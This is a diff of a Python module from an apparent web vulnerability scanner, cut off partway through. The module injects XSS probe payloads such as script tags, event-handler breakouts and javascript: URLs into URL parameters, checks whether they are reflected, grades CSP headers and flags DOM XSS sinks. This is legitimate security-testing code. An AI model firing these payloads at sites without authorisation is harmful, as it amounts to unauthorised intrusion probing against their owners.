@@ -1,139 +1,200 @@
-# xss_part.py — XSS phases & helpers
+# xss_part.py — Advanced XSS engine (refactored & extended)
+# Features:
+# - Context-aware payloads (html / attr / js / url)
+# - DOM XSS (sources + sinks + lightweight taint hints + FP reduction)
+# - Advanced reflected XSS (decode/unescape reflection + confidence scoring + payload mutation)
+# - Smarter auto-verify (token-based, decode-aware)
+# - Stored XSS (submit + check view pages) + guess_view_pages()
+# Notes:
+# - Designed to integrate with scanner.py (expects: XSS_PAYLOADS, run_context_aware_xss_phase,
+#   run_advanced_reflected_xss_phase, run_dom_xss_phase, auto_verify_xss, analyze_csp,
+#   classify_xss_exploitability, analyze_x_xss_protection, run_stored_xss_phase, guess_view_pages)
 
 import re
 import time
-import html
-import uuid  # ✅ Phase 11
+import html as _html
+import uuid
 import urllib.parse as urllib_parse
 from urllib.parse import urlparse, urlencode, urlunparse, urljoin
 from copy import deepcopy
 from bs4 import BeautifulSoup
 import requests
 
-# --- Basic reflected XSS payloads ---
+# =========================================================
+# Payloads
+# =========================================================
+
+# Base reflected payloads (kept for compatibility)
 XSS_PAYLOADS = [
     "<script>alert(1)</script>",
     "\"><script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
-    '";alert(1);//',
     "';alert(1);//",
+    "\";alert(1);//",
     "</script><script>alert(1)</script>",
-    '" autofocus onfocus=alert(1) x="'
+    "\" autofocus onfocus=alert(1) x=\""
 ]
 
-# Phase 8: Context-specific XSS payloads
+# Context-aware payloads
 CTX_XSS_PAYLOADS = {
     "html": [
         "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>"
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
     ],
     "attr": [
-        "\"><script>alert(1)</script>",
-        '" autofocus onfocus=alert(1) x="'
+        "\" onmouseover=alert(1) x=\"",
+        "' onfocus=alert(1) x='",
+        "\" autofocus onfocus=alert(1) x=\"",
     ],
     "js": [
-        '";alert(1);//',
         "';alert(1);//",
-        "</script><script>alert(1)</script>"
-    ]
+        "\";alert(1);//",
+        "</script><script>alert(1)</script>",
+    ],
+    "url": [
+        "javascript:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "javascript%3Aalert%281%29",
+    ],
 }
 
-# Phase 9: Smart payloads
+# Advanced / smart payloads
 XSS_SMART_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "\"><script>alert(1)</script>",
-    "'\"><img src=x onerror=alert(1)>",
     "<svg onload=alert(1)>",
     "<img src=x onerror=alert(1)>",
     "<body onload=alert(1)>",
-    "javascript:alert(1)",
     "<iframe srcdoc='<script>alert(1)</script>'>",
+    "javascript:alert(1)",
 ]
 
+# Key indicators (used carefully to avoid FP)
 XSS_KEY_PARTS = [
-    "script", "onerror", "onload", "alert",
-    "<img", "<svg", "<iframe", "srcdoc", "javascript:"
+    "<script", "onerror", "onload", "javascript:",
+    "srcdoc", "<iframe", "<svg"
 ]
 
 HTML_ENCODE_MARKERS = ["&lt;", "&gt;", "&quot;", "&#", "&amp;"]
 
-# -------------------------
-# Phase 12: CSP & Security Headers Awareness
-# -------------------------
+# =========================================================
+# Small utilities
+# =========================================================
+
+def _safe_unescape(s: str) -> str:
+    try:
+        return _html.unescape(s or "")
+    except Exception:
+        return s or ""
+
+def _safe_urldecode(s: str) -> str:
+    try:
+        return urllib_parse.unquote_plus(s or "")
+    except Exception:
+        return s or ""
+
+def _norm_text(s: str) -> str:
+    return (s or "").replace("\x00", "")
+
+def _contains_marker_decode_aware(body: str, marker: str) -> bool:
+    """
+    Checks marker presence with decode/unescape variants to reduce false negatives:
+    - raw body
+    - html.unescape(body)
+    - urldecode(body)
+    - html.unescape(urldecode(body)) etc
+    """
+    if not body or not marker:
+        return False
+
+    body_raw = body
+    body_unesc = _safe_unescape(body_raw)
+    body_ud = _safe_urldecode(body_raw)
+    body_ud_unesc = _safe_unescape(body_ud)
+
+    # also check marker decoded variants
+    m_raw = marker
+    m_unesc = _safe_unescape(marker)
+    m_ud = _safe_urldecode(marker)
+    m_ud_unesc = _safe_unescape(m_ud)
+
+    candidates_body = [body_raw, body_unesc, body_ud, body_ud_unesc]
+    candidates_m = [m_raw, m_unesc, m_ud, m_ud_unesc]
+
+    for b in candidates_body:
+        for m in candidates_m:
+            if m and m in b:
+                return True
+    return False
+
+def _looks_fully_encoded(body: str) -> bool:
+    """
+    Very rough heuristic: if the page contains common encode markers and
+    DOES NOT contain '<' or '>' at all, it might be heavily encoded.
+    We use it only to reduce obvious FPs, not as a strict blocker.
+    """
+    if not body:
+        return False
+    b = body
+    if ("<" not in b and ">" not in b) and any(m in b for m in HTML_ENCODE_MARKERS):
+        return True
+    return False
+
+# =========================================================
+# Phase 12: CSP & Security Headers
+# =========================================================
+
 def _split_csp_directives(csp: str) -> dict:
-    """
-    Returns dict like {"default-src": ["'self'"], "script-src": ["'self'", "'unsafe-inline'"], ...}
-    """
     out = {}
     if not csp:
         return out
-    parts = [p.strip() for p in csp.split(";") if p.strip()]
-    for p in parts:
-        tokens = p.split()
+    for part in [p.strip() for p in csp.split(";") if p.strip()]:
+        tokens = part.split()
         if not tokens:
             continue
-        name = tokens[0].lower()
-        vals = [t.strip() for t in tokens[1:]]
-        out[name] = vals
+        out[tokens[0].lower()] = [t.lower() for t in tokens[1:]]
     return out
 
 def analyze_csp(headers: dict) -> dict:
-    """
-    Heuristic CSP assessment for typical reflected XSS payloads (inline/event handlers).
-    Returns:
-      {
-        "present": bool,
-        "level": "none" | "strong" | "weak",
-        "reason": str,
-        "raw": str
-      }
-    """
-    csp = headers.get("Content-Security-Policy") or headers.get("content-security-policy") or ""
-    csp = (csp or "").strip()
+    csp = (headers.get("Content-Security-Policy")
+           or headers.get("content-security-policy")
+           or "").strip()
     if not csp:
-        return {"present": False, "level": "none", "reason": "No CSP header", "raw": ""}
+        return {"present": False, "level": "none", "reason": "No CSP", "raw": ""}
 
     d = _split_csp_directives(csp)
-
-    # Effective script policy: script-src preferred, else default-src
     script_policy = d.get("script-src") or d.get("default-src") or []
-    sp_join = " ".join(script_policy).lower()
+    sp = " ".join(script_policy)
 
-    has_nonce_or_hash = any(
-        v.startswith("'nonce-") or v.startswith("'sha256-") or v.startswith("'sha384-") or v.startswith("'sha512-")
-        for v in script_policy
-    )
+    unsafe_inline = "'unsafe-inline'" in sp
+    unsafe_eval = "'unsafe-eval'" in sp
+    wildcard = "*" in script_policy
+    nonce_or_hash = any(v.startswith("'nonce-") or v.startswith("'sha") for v in script_policy)
 
-    allows_inline = "'unsafe-inline'" in sp_join
-    allows_eval = "'unsafe-eval'" in sp_join
-    allows_any = "*" in script_policy
-    allows_data_blob = any(v in ("data:", "blob:") for v in script_policy)
+    if unsafe_inline or unsafe_eval or wildcard:
+        return {
+            "present": True,
+            "level": "weak",
+            "reason": "CSP allows inline/eval/wildcard",
+            "raw": csp
+        }
 
-    # Weak CSP signals (more likely exploitable)
-    if allows_inline or allows_eval or allows_any:
-        reasons = []
-        if allows_inline: reasons.append("unsafe-inline")
-        if allows_eval: reasons.append("unsafe-eval")
-        if allows_any: reasons.append("wildcard *")
-        if allows_data_blob: reasons.append("data:/blob:")
-        return {"present": True, "level": "weak", "reason": "CSP allows " + ", ".join(reasons), "raw": csp}
+    if nonce_or_hash:
+        return {
+            "present": True,
+            "level": "strong",
+            "reason": "Nonce/hash required for scripts",
+            "raw": csp
+        }
 
-    # If nonce/hash required and no unsafe-inline => strong against inline payloads
-    if has_nonce_or_hash and not allows_inline:
-        return {"present": True, "level": "strong", "reason": "Nonce/Hash required for scripts (inline blocked)", "raw": csp}
-
-    # Generally: no unsafe-inline => inline scripts blocked
-    if not allows_inline:
-        return {"present": True, "level": "strong", "reason": "No unsafe-inline (inline/event handlers likely blocked)", "raw": csp}
-
-    return {"present": True, "level": "strong", "reason": "CSP seems restrictive", "raw": csp}
+    return {
+        "present": True,
+        "level": "strong",
+        "reason": "Inline scripts blocked",
+        "raw": csp
+    }
 
 def analyze_x_xss_protection(headers: dict) -> dict:
-    """
-    Legacy header. Useful for reporting only (modern browsers mostly ignore it).
-    """
-    v = headers.get("X-XSS-Protection") or headers.get("x-xss-protection") or ""
-    v = (v or "").strip()
+    v = (headers.get("X-XSS-Protection") or "").strip()
     if not v:
         return {"present": False, "value": "", "status": "missing"}
     if v.startswith("0"):
@@ -144,96 +205,99 @@ def analyze_x_xss_protection(headers: dict) -> dict:
 
 def classify_xss_exploitability(csp_info: dict) -> str:
     """
-    Returns:
-      - VULNERABLE_BUT_CSP_MITIGATES
-      - VULNERABLE_AND_EXPLOITABLE
+    Correct logic:
+    - If NO CSP -> usually exploitable (client-side defenses absent)
+    - If CSP weak -> exploitable
+    - If CSP strong -> vulnerable but mitigated (may still bypass, but we label conservatively)
     """
-    if not csp_info or csp_info.get("level") == "strong":
+    if not csp_info or not csp_info.get("present"):
+        return "VULNERABLE_AND_EXPLOITABLE"
+    if csp_info.get("level") == "strong":
         return "VULNERABLE_BUT_CSP_MITIGATES"
     return "VULNERABLE_AND_EXPLOITABLE"
 
-def enrich_finding_with_headers(finding: dict, resp) -> dict:
-    """
-    Attach CSP + X-XSS-Protection analysis to finding.
-    """
+def enrich_finding_with_headers(finding: dict, resp):
     if not finding or not resp:
         return finding
 
-    csp_info = analyze_csp(getattr(resp, "headers", {}) or {})
-    xxp_info = analyze_x_xss_protection(getattr(resp, "headers", {}) or {})
-
-    exploit_status = classify_xss_exploitability(csp_info)
-
-    extra = finding.get("extra") or {}
-    extra["csp_present"] = csp_info.get("present")
-    extra["csp_level"] = csp_info.get("level")
-    extra["csp_reason"] = csp_info.get("reason")
-    extra["csp_raw"] = csp_info.get("raw")
-    extra["x_xss_protection_present"] = xxp_info.get("present")
-    extra["x_xss_protection_value"] = xxp_info.get("value")
-    extra["x_xss_protection_status"] = xxp_info.get("status")
-    finding["extra"] = extra
-
-    finding["exploit_status"] = exploit_status
+    csp = analyze_csp(resp.headers or {})
+    xxp = analyze_x_xss_protection(resp.headers or {})
+    finding.setdefault("extra", {}).update({
+        "csp_present": csp.get("present"),
+        "csp_level": csp.get("level"),
+        "csp_reason": csp.get("reason"),
+        "csp_raw": csp.get("raw"),
+        "x_xss_protection_present": xxp.get("present"),
+        "x_xss_protection_value": xxp.get("value"),
+        "x_xss_protection_status": xxp.get("status"),
+    })
+    finding["exploit_status"] = classify_xss_exploitability(csp)
     return finding
 
+# =========================================================
+# Auto-verify XSS (decode-aware)
+# =========================================================
 
-# -------------------------
-# Auto-verify XSS
-# -------------------------
 def auto_verify_xss(method, url, param_name, original_params, post_data, headers,
                     request_with_timeout, json_body=None, json_key=None):
-    token = f"INJ_TOKEN_{int(time.time())}"
+    """
+    Token-based verification:
+    - inject payload with unique token
+    - check token is reflected (decode/unescape aware)
+    - reduce FP by requiring token appear (not just generic keywords)
+    """
+    token = f"XSSV_{uuid.uuid4().hex[:10]}"
     payload = f"<script>console.log('{token}')</script>"
 
+    r = None
+
     if json_body is not None and json_key is not None:
-        jb = deepcopy(json_body); jb[json_key] = payload
+        jb = deepcopy(json_body)
+        jb[json_key] = payload
         r = request_with_timeout(method, url, headers=headers, json_body=jb)
     else:
         parsed = urlparse(url)
-        params_copy = deepcopy(original_params) if original_params else {}
-        key = param_name if param_name is not None else "_scantest"
-        params_copy[key] = [payload]
-        q = urlencode({k: v[0] for k, v in params_copy.items()}, doseq=False)
-        new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))
+        params = deepcopy(original_params) if original_params else {}
+        key = param_name or "_xsstest"
+        params[key] = [payload]
+        q = urlencode({k: v[0] for k, v in params.items()}, doseq=False)
+        test_url = urlunparse(parsed._replace(query=q))
+        r = request_with_timeout(method, test_url, headers=headers, data=post_data)
 
-        if method.upper() == "POST" and post_data and key in post_data:
-            pd = deepcopy(post_data); pd[key] = payload
-            r = request_with_timeout("POST", url, data=pd, headers=headers)
-        else:
-            r = request_with_timeout("GET" if method.upper() == "GET" else "POST", new_url, data=post_data, headers=headers)
-
-    if not r:
+    if not r or not r.text:
         return False
-    text = r.text or ""
-    return (payload in text) or (token in text)
 
+    body = _norm_text(r.text)
 
-# -------------------------
-# Phase 8: Context-aware XSS
-# -------------------------
+    # if page looks like it escapes everything AND token isn't found even after unescape -> not verified
+    if _looks_fully_encoded(body) and not _contains_marker_decode_aware(body, token):
+        return False
+
+    # verified if token appears (raw/decoded/unescaped)
+    return _contains_marker_decode_aware(body, token)
+
+# =========================================================
+# Phase 8: Context-aware reflected XSS
+# =========================================================
+
 def detect_xss_context(html_text: str, marker: str):
     if not html_text or marker not in html_text:
         return None
-    idx = html_text.find(marker)
-    if idx == -1:
-        return None
 
-    open_idx = html_text.rfind("<script", 0, idx)
-    close_idx = html_text.rfind("</script", 0, idx)
-    if open_idx != -1 and (close_idx == -1 or close_idx < open_idx):
+    idx = html_text.find(marker)
+
+    # inside <script> ... (very rough)
+    if "<script" in html_text[:idx].lower() and "</script>" not in html_text[:idx].lower():
         return "js"
 
-    window = 120
-    start = max(0, idx - window)
-    end = min(len(html_text), idx + window)
-    snippet = html_text[start:end]
+    window = html_text[max(0, idx - 200):idx + 200]
 
-    attr_re = re.compile(
-        r"\b[\w:-]+\s*=\s*(['\"]).*?" + re.escape(marker) + r".*?\1",
-        re.DOTALL | re.IGNORECASE
-    )
-    if attr_re.search(snippet):
+    # URL context in href/src/action
+    if re.search(r"\b(href|src|action)\s*=\s*['\"]?[^'\">]*" + re.escape(marker), window, re.I):
+        return "url"
+
+    # attribute context
+    if re.search(r"\b[\w:-]+\s*=\s*(['\"]).*?" + re.escape(marker), window, re.I):
         return "attr"
 
     return "html"
@@ -241,597 +305,497 @@ def detect_xss_context(html_text: str, marker: str):
 def run_context_aware_xss_phase(method, url, params, headers, json_body, post_data,
                                 base_status, base_text, verbose, fingerprint,
                                 request_with_timeout, _single_injection_attempt, log=print):
+    """
+    Strategy:
+    - For each param: inject unique marker to learn context
+    - If marker reflects -> pick payloads for that context
+    - Use scanner's _single_injection_attempt for unified reporting (and Phase 12 enrichment)
+    """
     findings = []
-    method = method.upper()
-    if method != "GET" or not params or json_body is not None:
+    if method.upper() != "GET" or not params or json_body:
         return findings
 
     parsed = urlparse(url)
 
-    for param_name, values in params.items():
-        marker = f"CTX_XSS_{param_name}_{int(time.time() * 1000)}"
+    for pname in params:
+        marker = f"CTX_{pname}_{uuid.uuid4().hex[:8]}"
+        test_params = deepcopy(params)
+        test_params[pname] = [marker]
+        q = urlencode({k: v[0] for k, v in test_params.items()}, doseq=False)
+        murl = urlunparse(parsed._replace(query=q))
 
-        new_params = deepcopy(params)
-        new_params[param_name] = [marker]
-        query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
-        marker_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
-
-        r = request_with_timeout(method, marker_url, headers=headers)
-        if not r or r.status_code >= 500:
+        r = request_with_timeout("GET", murl, headers=headers)
+        if not r or not r.text:
             continue
 
-        body = r.text or ""
-        if marker not in body:
+        # must reflect marker (decode-aware)
+        if not _contains_marker_decode_aware(r.text, marker):
             continue
 
-        ctx = detect_xss_context(body, marker)
+        ctx = detect_xss_context(r.text, marker) or "html"
         if verbose:
-            log(f"[CTX-XSS] {url} param '{param_name}' marker reflected in context={ctx}")
+            log(f"[CTX-XSS] {url} param={pname} ctx={ctx}")
 
-        payloads = CTX_XSS_PAYLOADS.get(ctx, [])
-        for pl in payloads:
+        for payload in CTX_XSS_PAYLOADS.get(ctx, []):
             f = _single_injection_attempt(
-                method=method,
+                method="GET",
                 url=url,
-                param_name=param_name,
+                param_name=pname,
                 original_params=params,
                 base_text=base_text,
                 base_status=base_status,
-                payload=pl,
+                payload=payload,
                 post_data=post_data,
                 headers=headers,
-                json_body=None,
-                json_key=None,
                 verbose=verbose,
                 fingerprint=fingerprint
             )
             if f:
-                # keep context info
-                extra = f.get("extra") or {}
-                extra["xss_context"] = ctx
-                f["extra"] = extra
-
-                # Phase 12 enrichment (best effort: use response headers by re-fetching test_url if present)
-                test_url = f.get("test_url")
-                if test_url:
-                    rr = request_with_timeout("GET", test_url, headers=headers)
-                    if rr:
-                        f = enrich_finding_with_headers(f, rr)
-
+                f.setdefault("extra", {})["xss_context"] = ctx
+                # r is marker-response; better enrich with test payload response in scanner,
+                # but keeping CSP info from r is still useful
+                f = enrich_finding_with_headers(f, r)
                 findings.append(f)
 
     return findings
 
+# =========================================================
+# Phase 9: Advanced reflected XSS (confidence-based + decode-aware reflection)
+# =========================================================
 
-# -------------------------
-# Phase 9: Advanced Reflected XSS
-# -------------------------
-def index_to_line_col(text: str, idx: int):
-    line = text.count("\n", 0, idx) + 1
-    last_nl = text.rfind("\n", 0, idx)
-    if last_nl == -1:
-        col = idx + 1
-    else:
-        col = idx - last_nl
-    return line, col
+def _payload_reflected_decode_aware(body: str, payload: str) -> bool:
+    """
+    Checks if payload is reflected either raw or after html.unescape/urldecode.
+    """
+    if not body or not payload:
+        return False
+    return _contains_marker_decode_aware(body, payload)
 
-def detect_reflection_context_adv(text: str, idx: int) -> str:
-    window_before = text[max(0, idx - 80):idx].lower()
-    window_after = text[idx:idx + 80].lower()
+def _is_encoded_reflection(body: str, payload: str) -> bool:
+    """
+    If raw payload is not present but html-escaped version is present,
+    treat it as encoded (mitigated) to reduce FP.
+    """
+    if not body or not payload:
+        return False
 
-    if '="' in window_before or "='" in window_before:
-        return "HTML Attribute"
-    if "<script" in window_before:
-        return "JavaScript Context"
-    if "<" in window_before and ">" in window_after:
-        return "HTML Tag Body"
-    if "href=" in window_before or "src=" in window_before:
-        return "URL / Attribute"
-    return "Unknown"
+    raw_present = payload in (body or "")
+    if raw_present:
+        return False
 
-def find_reflections_for_payload(payload: str, response_text: str):
-    results = []
-    if response_text is None:
-        return results
+    esc = _html.escape(payload, quote=True)
+    # also allow common partial escapes
+    return esc in body or (_safe_unescape(body) and payload in _safe_unescape(body) and raw_present is False)
 
-    layers = [
-        ("raw", response_text),
-        ("html_unescape", html.unescape(response_text)),
-        ("url_unquote+html_unescape", html.unescape(urllib_parse.unquote(response_text)))
-    ]
-
-    for layer_name, text in layers:
-        if not text:
-            continue
-
-        start_idx = text.find(payload)
-        if start_idx != -1:
-            line, col = index_to_line_col(text, start_idx)
-            ctx = detect_reflection_context_adv(text, start_idx)
-            encoded = any(m in response_text for m in HTML_ENCODE_MARKERS)
-            results.append({
-                "match_type": "exact",
-                "layer": layer_name,
-                "payload": payload,
-                "matched_string": payload,
-                "line": line,
-                "column": col,
-                "context": ctx,
-                "html_encoded": encoded
-            })
-
-        text_low = text.lower()
-        for key in XSS_KEY_PARTS:
-            key_low = key.lower()
-            idx = text_low.find(key_low)
-            if idx != -1:
-                line, col = index_to_line_col(text, idx)
-                ctx = detect_reflection_context_adv(text, idx)
-                encoded = any(m in response_text for m in HTML_ENCODE_MARKERS)
-                results.append({
-                    "match_type": "partial",
-                    "layer": layer_name,
-                    "payload": payload,
-                    "matched_string": key,
-                    "line": line,
-                    "column": col,
-                    "context": ctx,
-                    "html_encoded": encoded
-                })
-
-    return results
-
-def guess_xss_severity_from_context(context: str) -> str:
-    ctx = (context or "").lower()
-    if "javascript" in ctx:
-        return "high"
-    if "attribute" in ctx or "url" in ctx:
-        return "medium"
-    return "low"
-
-def run_advanced_reflected_xss_phase(method, url, params, headers, base_text_raw, fingerprint,
-                                    request_with_timeout, compute_score, log, now_ts, verbose=False):
+def run_advanced_reflected_xss_phase(method, url, params, headers, base_text_raw,
+                                     fingerprint, request_with_timeout,
+                                     compute_score, log, now_ts, verbose=False):
+    """
+    Strategy:
+    - Try smart payloads
+    - Accept only if payload reflected decode-aware
+    - Reject if reflection appears encoded-only
+    """
     findings = []
-    method = method.upper()
     if not params:
         return findings
 
     parsed = urlparse(url)
-    base_len = len(base_text_raw or "")
 
-    for param_name, values in params.items():
-        original_value = values[0] if values else ""
-
+    for pname in params:
         for payload in XSS_SMART_PAYLOADS:
-            test_params = deepcopy(params)
-            test_params[param_name] = [f"{original_value}{payload}"]
-            query = urlencode({k: v[0] for k, v in test_params.items()}, doseq=False)
-            inj_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))
+            tp = deepcopy(params)
+            tp[pname] = [payload]
+            q = urlencode({k: v[0] for k, v in tp.items()}, doseq=False)
+            test_url = urlunparse(parsed._replace(query=q))
 
-            resp = request_with_timeout(method, inj_url, headers=headers)
-            if not resp:
+            r = request_with_timeout(method, test_url, headers=headers)
+            if not r or not r.text:
                 continue
 
-            body = resp.text or ""
-            reflections = find_reflections_for_payload(payload, body)
-            if not reflections:
+            body = _norm_text(r.text)
+
+            # reflection must exist decode-aware
+            if not _payload_reflected_decode_aware(body, payload):
                 continue
 
-            best = sorted(reflections, key=lambda r: 0 if r["match_type"] == "exact" else 1)[0]
-            ctx = best["context"]
-            severity = guess_xss_severity_from_context(ctx)
+            # if it's only encoded reflection -> skip (reduce FP)
+            if _is_encoded_reflection(body, payload):
+                continue
 
-            if severity == "high":
-                base_conf = 50
-                score_delta = 45
-            elif severity == "medium":
-                base_conf = 40
-                score_delta = 35
-            else:
-                base_conf = 30
-                score_delta = 25
-
-            verify_result = {
+            verify = {
                 "verified": True,
-                "evidence": f"Reflected XSS payload at line {best['line']}, column {best['column']} in {ctx}",
-                "score_delta": score_delta,
+                "evidence": "Reflected payload (decode-aware) without encoding-only pattern",
+                "score_delta": 40,
                 "elapsed": 0.0
             }
 
-            score = compute_score(base_confidence=base_conf, fingerprint=fingerprint, verify_result=verify_result, payload=payload)
-            status_label = "confirmed" if score >= 50 else ("probable" if score >= 30 else "low")
+            score = compute_score(
+                base_confidence=45,
+                fingerprint=fingerprint,
+                verify_result=verify,
+                payload=payload
+            ) if compute_score else 60
 
             finding = {
                 "timestamp": now_ts(),
                 "url": url,
-                "test_url": inj_url,
+                "test_url": test_url,
                 "method": method,
-                "injected_param": param_name,
+                "injected_param": pname,
                 "payload": payload,
-                "vuln_type": "Reflected XSS",
-                "reason": verify_result["evidence"],
-                "status_code": resp.status_code,
+                "vuln_type": "XSS",                 # keep consistent with scanner
+                "report_type": "Reflected XSS",
+                "xss_subtype": "reflected",
+                "category": "XSS",
+                "reason": verify["evidence"],
+                "status_code": r.status_code,
                 "auto_verified": True,
-                "verify": verify_result,
+                "verify": verify,
                 "fingerprint": fingerprint or {},
                 "score": score,
-                "status": status_label,
-                "base_len": base_len,
-                "resp_len": len(body or ""),
-                "extra": {
-                    "xss_match_type": best["match_type"],
-                    "xss_layer": best["layer"],
-                    "xss_context": ctx,
-                    "xss_line": best["line"],
-                    "xss_column": best["column"],
-                    "xss_html_encoded": best["html_encoded"],
-                    "xss_matched_string": best["matched_string"],
-                }
+                "status": "confirmed" if score >= 50 else "probable",
             }
 
-            # ✅ Phase 12: attach CSP / X-XSS-Protection / exploitability
-            finding = enrich_finding_with_headers(finding, resp)
-
+            finding = enrich_finding_with_headers(finding, r)
             if verbose:
-                # لو CSP قوي: خليها تطلع واضحة باللوج
-                es = finding.get("exploit_status")
-                csp_lvl = (finding.get("extra") or {}).get("csp_level")
-                log(f"[XSS-REFLECTED][{severity.upper()}][{es}][CSP={csp_lvl}] {url} param={param_name} ctx={ctx} payload={payload}")
+                log(f"[XSS-ADV] {url} param={pname} payload={payload}")
 
             findings.append(finding)
             break
 
     return findings
 
+# =========================================================
+# Phase 10: DOM XSS (static + lightweight taint hints + FP reduction)
+# =========================================================
 
-# -------------------------
-# Phase 10: DOM XSS static analysis
-# -------------------------
 DOM_XSS_SOURCES = [
-    r"location\.hash",
-    r"location\.search",
-    r"location\.href",
-    r"document\.URL",
-    r"document\.documentURI",
-    r"document\.referrer",
+    r"location\.(hash|search|href)",
+    r"document\.(URL|documentURI|referrer)",
     r"localStorage",
     r"sessionStorage",
     r"window\.name"
 ]
 
 DOM_XSS_SINKS = [
-    r"innerHTML",
-    r"outerHTML",
-    r"document\.write",
-    r"document\.writeln",
-    r"insertAdjacentHTML",
-    r"eval\(",
-    r"setTimeout\(",
-    r"setInterval\(",
-    r"Function\(",
-    r"\.html\("
+    r"\.innerHTML\s*=",
+    r"\.outerHTML\s*=",
+    r"document\.write\s*\(",
+    r"insertAdjacentHTML\s*\(",
+    r"\beval\s*\(",
+    r"\bFunction\s*\(",
+    r"setTimeout\s*\(",
+    r"setInterval\s*\("
 ]
 
-DOM_SRC_RES = [re.compile(p) for p in DOM_XSS_SOURCES]
-DOM_SINK_RES = [re.compile(p) for p in DOM_XSS_SINKS]
+SRC_RE = [re.compile(p, re.I) for p in DOM_XSS_SOURCES]
+SINK_RE = [re.compile(p, re.I) for p in DOM_XSS_SINKS]
 
-def _analyze_js_for_dom_xss(js_code: str, script_id: str, script_url: str = None):
-    results = []
-    if not js_code:
-        return results
+_ASSIGN_RE = re.compile(r"\b(var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*(.+?);", re.I)
+_SIMPLE_ASSIGN_RE = re.compile(r"\b([A-Za-z_$][\w$]*)\s*=\s*(.+?);", re.I)
 
-    lines = js_code.splitlines()
-    for idx, line in enumerate(lines, start=1):
-        line_stripped = line.strip()
-        if not line_stripped:
+def _extract_taint_vars(lines):
+    """
+    Collect variables that are assigned from sources:
+      const x = location.hash;
+      y = document.URL;
+    """
+    tainted = set()
+    for line in lines:
+        ln = line.strip()
+        if not ln or ln.startswith("//"):
             continue
 
-        has_src = []
-        has_sink = []
-
-        for sre in DOM_SRC_RES:
-            if sre.search(line_stripped):
-                has_src.append(sre.pattern)
-
-        for kre in DOM_SINK_RES:
-            if kre.search(line_stripped):
-                has_sink.append(kre.pattern)
-
-        if has_src and has_sink:
-            results.append({
-                "script_id": script_id,
-                "script_url": script_url,
-                "line_no": idx,
-                "line": line_stripped[:300],
-                "sources": has_src,
-                "sinks": has_sink
-            })
-
-    return results
-
-def _collect_scripts_from_html(base_url: str, html_text: str, TIMEOUT: int, headers=None):
-    scripts = []
-    try:
-        soup = BeautifulSoup(html_text, "html.parser")
-    except Exception:
-        return scripts
-
-    inline_idx = 0
-    for s in soup.find_all("script"):
-        src = s.get("src")
-        if src:
+        m = _ASSIGN_RE.search(ln) or _SIMPLE_ASSIGN_RE.search(ln)
+        if not m:
             continue
-        code = s.string or ""
-        if not code or not code.strip():
-            continue
-        inline_idx += 1
-        scripts.append({"code": code, "id": f"inline_{inline_idx}", "url": None})
 
-    for s in soup.find_all("script", src=True):
-        src = s.get("src")
-        if not src:
-            continue
-        js_url = urljoin(base_url, src)
-        try:
-            resp = requests.get(js_url, headers=headers, timeout=TIMEOUT, allow_redirects=True)
-        except Exception:
-            continue
-        if not resp or resp.status_code != 200:
-            continue
-        code = resp.text or ""
-        if not code.strip():
-            continue
-        scripts.append({"code": code, "id": f"external::{src}", "url": js_url})
+        varname = m.group(2) if m.re is _ASSIGN_RE else m.group(1)
+        expr = m.group(3) if m.re is _ASSIGN_RE else m.group(2)
 
-    return scripts
+        if any(r.search(expr) for r in SRC_RE):
+            tainted.add(varname)
+    return tainted
+
+def _sink_uses_tainted(line: str, tainted_vars: set) -> bool:
+    if not tainted_vars:
+        return False
+    for v in tainted_vars:
+        # must appear as a token, not as substring of another word
+        if re.search(rf"\b{re.escape(v)}\b", line):
+            return True
+    return False
 
 def run_dom_xss_phase(url, base_html, TIMEOUT, headers=None, fingerprint=None,
-                      compute_score=None, log=print, now_ts=None, verbose=False):
+                      compute_score=None, log=print, now_ts=None,
+                      verbose=False, session=None):
     findings = []
     if not base_html:
         return findings
 
-    scripts = _collect_scripts_from_html(url, base_html, TIMEOUT, headers=headers)
-    if not scripts:
-        return findings
+    soup = BeautifulSoup(base_html, "html.parser")
+    scripts = []
 
-    for sc in scripts:
-        code = sc["code"]
-        sid = sc["id"]
-        surl = sc["url"]
+    # inline scripts
+    for i, s in enumerate(soup.find_all("script"), 1):
+        if s.string and s.string.strip():
+            scripts.append(("inline", f"inline#{i}", s.string))
 
-        raw_hits = _analyze_js_for_dom_xss(code, sid, script_url=surl)
-        for h in raw_hits:
-            reason = (
-                "Potential DOM-based XSS: source(s) "
-                + ", ".join(h["sources"])
-                + " flowing into sink(s) "
-                + ", ".join(h["sinks"])
-                + f" at line {h['line_no']} in script {h['script_id']}"
-            )
+    # external scripts
+    sess = session or requests
+    for s in soup.find_all("script", src=True):
+        try:
+            src_url = urljoin(url, s.get("src"))
+            r = sess.get(src_url, headers=headers, timeout=TIMEOUT, allow_redirects=True)
+            if r and r.text:
+                scripts.append(("external", src_url, r.text))
+        except Exception:
+            pass
 
-            verify_result = {"verified": False, "evidence": "static JS pattern (source→sink) only",
-                             "score_delta": 0, "elapsed": 0.0}
+    # analyze each script with lightweight taint flow:
+    #   - collect tainted vars from source assignments
+    #   - flag sinks only if using tainted var (reduces FP)
+    for kind, sid, code in scripts:
+        lines = code.splitlines()
+        tainted = _extract_taint_vars(lines)
+
+        for ln, line in enumerate(lines, 1):
+            sline = line.strip()
+            if not sline or sline.startswith("//"):
+                continue
+
+            sinks = [r.pattern for r in SINK_RE if r.search(sline)]
+            if not sinks:
+                continue
+
+            # FP reduction: require either:
+            # 1) same line contains a source AND sink, or
+            # 2) sink line uses tainted variable assigned from sources elsewhere
+            srcs_inline = [r.pattern for r in SRC_RE if r.search(sline)]
+            flow_ok = bool(srcs_inline) or _sink_uses_tainted(sline, tainted)
+
+            if not flow_ok:
+                continue
 
             score = 35
             if compute_score:
-                score = compute_score(base_confidence=35, fingerprint=fingerprint, verify_result=verify_result, payload=None)
+                score = compute_score(
+                    base_confidence=35,
+                    fingerprint=fingerprint,
+                    verify_result={"verified": False, "score_delta": 0},
+                    payload=None
+                )
 
-            finding = {
